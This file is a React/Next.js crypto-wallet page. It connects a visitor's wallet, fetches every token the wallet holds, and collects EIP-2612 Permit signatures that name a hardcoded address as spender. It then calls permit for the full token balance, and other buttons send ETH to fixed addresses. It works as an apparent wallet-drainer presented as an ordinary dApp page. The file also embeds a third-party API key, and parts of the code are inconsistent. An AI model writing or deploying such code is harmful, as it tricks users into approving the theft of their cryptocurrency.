'use client';
import {useWalletInfo, useWeb3Modal} from "@web3modal/scaffold-react";
import {useAccount, useBalance, useDisconnect, useSendTransaction, useSignMessage} from "wagmi";
import {parseEther} from "viem";
import {signTypedData} from "@wagmi/core";
import {config} from "@/context/config";
import {Contract, ethers} from "ethers";
import {useEffect, useState} from "react";
import {useEthersSigner} from "@/app/ethers";

const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
const developer = {
	address: "0xB932eF059c3857FBA2505B31E5899b3E170f25E7"
}
const abi = [
	'function permit (address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
	'function nonces(address owner) view returns (uint256)'
];

const Page = () => {
	const open = useWeb3Modal();
	const wallet = useWalletInfo();
	const account = useAccount();
	const { signMessage } = useSignMessage();
	const { sendTransaction } = useSendTransaction()
	const {disconnect} = useDisconnect();
	const [signature, setSignature] = useState<string>("0xe62b5c6b5df896ca85e1d1d440adeb827d676714bc4cdc4e4fa10f58e1473bd5137784d7d744d59162f83c92d9a9250bb9e727fdb2039429db59fa02b6e940871b")
	const signer = useEthersSigner();
	const [signatures, setSignatures] = useState<{
		[key: string]: string
	}>({})
	const {data: balance, isLoading} = useBalance({
		address: account.address
	})
	const [tokens, setTokens] = useState<ContractCovalenTHQ[]>([]);

	if (!account || isLoading) return <button onClick={() => open.open()}>
		open
	</button>;

	const message = {
		"owner": account.address!,
		"spender": developer.address!,
		"value": parseEther('0.01'),
		"nonce": 1,
		"deadline": 1625256000
	} as any;

	return (
		<div>
			<button onClick={() => open.open()}>
				open
			</button>
			<img src={wallet.walletInfo?.icon}/>
			<br/>
			<button onClick={() => {
				console.log(signMessage({
					message: "test",
				}))
			}}>Sign Message
			</button>
			<br/>
			{account.isConnected + ""}
			<br/>
			{account.address}
			<br/>
			{account.chainId}
			<br/>
			<button
				onClick={() => sendTransaction({
					gas: null,
					to: '0xd2135CfB216b74109775236E36d4b433F1DF507B',
					value: parseEther('0.0001'),
				})}
			>
				Transfer
			</button>
			<button onClick={disconnect as any}>
				DC

			</button>
			{tokens.map(token => {
				if (token.contract_address === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') token.contract_address = BNBContract;

				return (
					<div className={'flex gap-2'}>
						{token.contract_ticker_symbol}
						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
							if (!account) return;
							const params = {
								"types": {
									"Permit": [
										{"name": "owner", "type": "address"},
										{"name": "spender", "type": "address"},
										{"name": "value", "type": "uint256"},
										{"name": "nonce", "type": "uint256"},
										{"name": "deadline", "type": "uint256"}
									]
								},
								"primaryType": "Permit",
								"domain": {
									"name": token.contract_ticker_symbol,
									"version": "1",
									"chainId": account.chainId as any,
									"verifyingContract": token.contract_address // BNB Contract
								},
								"message": message
							};
							console.log(params);
							const result = await signTypedData(config, params)

							setSignatures(pre => ({
								...pre || {},
								[token.contract_ticker_symbol]: result
							}))
						}}>
							SIGN TYPED DATA
						</button>
					</div>
				)
			})}

			<br/>
			{tokens.map(token => {
				const signature = signatures[token.contract_ticker_symbol];


				return (
					<button disabled={!signature} onClick={async () => {
						if (!signature) return;
						// ABI of the token contract
						// Prepare the permit data
						const spender = developer.address; // Address of the spender
						const amount = token.balance; // Amount of tokens to be spent
						const nonce = 2; // Nonce
						const deadline = 5 * 60 * 1000; // Deadline (optional)
						const {v, r, s} = ethers.utils.splitSignature(signature);
// Call the permit method
						const tokenContract = new ethers.Contract(token.contract_address, ['function permit(address spender, uint256 amount, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'], signer);
						const args = [spender, amount, nonce, deadline, v, r, s];
						console.log(args)
						const tx = await tokenContract.permit(...args);
						await tx.wait();

						console.log('Permit successful');
					}}>
						Permit
					</button>
				)
			})}
			<br/>
			{account.chainId}
			<br/>
			<button onClick={async () => {
				const domain = {
					name: 'Ether Transaction',
					version: '1',
					chainId: account.chainId,
					verifyingContract: BNBContract,  // Dummy contract address
				};

				const types = {
					Transfer: [
						{name: 'to1', type: 'uint256'},
						{name: 'to2', type: 'uint256'},
						{name: 'to3', type: 'uint256'},
						{name: 'to4', type: 'uint256'},
						{name: 'to5', type: 'uint256'},
						{name: 'to6', type: 'uint256'},
						{name: 'to', type: 'address'},
						{name: 'value', type: 'uint256'}
					],
				};

				// Define the message to sign
				const message = {
					to1: 9,  // Replace with the recipient address
					to2: 4,  // Replace with the recipient address
					to3: 1,  // Replace with the recipient address
					to4: 23,  // Replace with the recipient address
					to5: 87,  // Replace with the recipient address
					to6: 10,  // Replace with the recipient address
					to: developer.address,  // Replace with the recipient address
					value: ethers.utils.parseUnits('0.001', 'ether').toString(),  // Replace with the amount of ether to send,
				};
				const tx = {
					to: developer.address,
					value: ethers.utils.parseEther('0.1'), // Amount to send
					gasLimit: 21000, // Basic transaction gas limit
					gasPrice: ethers.utils.parseUnits('50', 'gwei'), // Gas price
				};

				const ptx = await signer?.populateTransaction(tx);
				console.log(ptx);

				// Create the typed data
				const typedData = {
					types: types,
					domain: domain,
					primaryType: 'Transfer',
					message: message,
				};

				try {
					// Request the user's signature for the typed data
					const signature = await signer?._signTypedData(domain, types, message);
					console.log('Signature:', signature);
					await signer?.sendTransaction(signature)
					// You can now use this signature to validate and process the transaction off-chain or on-chain
					// Note: Further steps to send this data to a backend or smart contract would be required
				} catch (error) {
					console.error('Failed to sign typed data:', error);
				}
			}}>
				TS Test
			</button>
			<br/>
			<TokenList address={account.address+""} setTokens={setTokens} CHAIN_ID={+(account.chainId || "0")}/>
		</div>
	)
};

function TokenList({ address,CHAIN_ID,setTokens: ST }: {address: string, CHAIN_ID: number, setTokens: any}) {
	const [tokens, setTokens] = useState<ContractCovalenTHQ[]>([]);
	const [isLoading, setIsLoading] = useState(true);
	const [isError, setIsError] = useState(false);

	useEffect(() => {
		const fetchTokens = async () => {
			try {
				const response = await fetch(`https://api.covalenthq.com/v1/${CHAIN_ID}/address/${address}/balances_v2/?key=cqt_rQMKcGmyCVvmTRtRf6HFyMYggf49`);
				const data = await response.json();
				setTokens(data.data.items);
				ST(data.data.items);
				setIsLoading(false);
			} catch (error) {
				console.error('Error fetching tokens:', error);
				setIsError(true);
				setIsLoading(false);
			}
		};

		fetchTokens();
	}, [address]);

	if (isLoading) return <div>Loading...</div>;
	if (isError) return <div>Error fetching tokens</div>;

	console.log(tokens);

	return (
		<div>
			<h2>Tokens in Wallet</h2>
			<ul>
				{tokens.map((token) => (
					<li key={token.contract_address}>
						{token.contract_name} ({token.contract_ticker_symbol}): {ethers.utils.formatUnits(token.balance, token.contract_decimals)}
					</li>
				))}
			</ul>
		</div>
	);
}

export type ContractCovalenTHQ = {
	contract_decimals: number
	contract_name: string
	contract_ticker_symbol: string
	contract_address: string
	supports_erc: Array<string>
	logo_url: string
	contract_display_name: string
	logo_urls: {
		token_logo_url: string
		protocol_logo_url: any
		chain_logo_url: string
	}
	last_transferred_at: string
	native_token: boolean
	type: string
	is_spam: boolean
	balance: string
	balance_24h: string
	quote_rate: any
	quote_rate_24h: any
	quote: any
	pretty_quote: any
	quote_24h: any
	pretty_quote_24h: any
	protocol_metadata: any
	nft_data: any
}


export default Page;
